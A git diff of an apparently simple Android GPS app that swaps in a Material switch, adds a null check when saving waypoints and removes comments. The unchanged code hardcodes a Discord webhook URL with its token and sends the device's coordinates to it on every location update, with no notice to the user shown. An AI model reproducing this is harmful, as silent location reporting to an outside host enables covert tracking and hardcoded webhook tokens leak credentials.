@@ -9,7 +9,6 @@ import android.location.Location;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
-import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -27,6 +26,7 @@ import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.location.Priority;
 import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.android.material.switchmaterial.SwitchMaterial;
 
 import java.util.List;
 
@@ -34,10 +34,10 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_FINE_LOCATION = 99;
     TextView tv_lat, tv_lon, tv_altitude, tv_accuracy, tv_speed, tv_sensor, tv_updates, tv_address, tv_wp;
     Button bt_wp, bt_showp, bt_showmap;
-    Switch sw_locationupdates, sw_gps;
+    SwitchMaterial sw_locationupdates, sw_gps;
 
-    private static final int DEFAULT_UPDATE_INTERVAL = 5; // Updated to 5 seconds
-    private static final int FASTEST_UPDATE_INTERVAL = 2; // Updated to 2 seconds
+    private static final int DEFAULT_UPDATE_INTERVAL = 5;
+    private static final int FASTEST_UPDATE_INTERVAL = 2;
 
 
     Location currentLocation;
@@ -47,7 +47,6 @@ public class MainActivity extends AppCompatActivity {
     LocationCallback locationCallback;
     FusedLocationProviderClient fusedLocationProviderClient;
 
-    // Discord Webhook integration
     private DiscordWebhook discordWebhook;
     private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1483553823980257330/YNA4dBeRu_Q3ILbj2-cT6ep1eq6Wi9EdRo8g7uCt2POnamQ4oRtt7Be8Q27h75ZLtNES";
 
@@ -89,7 +88,6 @@ public class MainActivity extends AppCompatActivity {
                 if (location != null) {
                     updateUComponents(location);
                     
-                    // Ping Discord on every update
                     discordWebhook.sendLocation(
                             location.getLatitude(),
                             location.getLongitude(),
@@ -104,7 +102,12 @@ public class MainActivity extends AppCompatActivity {
             public void onClick(View view) {
                 MyApplication myApplication = (MyApplication) getApplicationContext();
                 savedLocations = myApplication.getMyLocations();
-                savedLocations.add(currentLocation);
+                if (currentLocation != null) {
+                    savedLocations.add(currentLocation);
+                    updateUComponents(currentLocation);
+                } else {
+                    Toast.makeText(MainActivity.this, "Location not available", Toast.LENGTH_SHORT).show();
+                }
             }
         });
 
@@ -135,7 +138,6 @@ public class MainActivity extends AppCompatActivity {
                     tv_sensor.setText("Using Towers + Wifi");
                 }
                 
-                // If updates are currently running, restart them with the new priority/interval
                 if (sw_locationupdates.isChecked()) {
                     stopLocationUpdates();
                     startLocationUpdates();
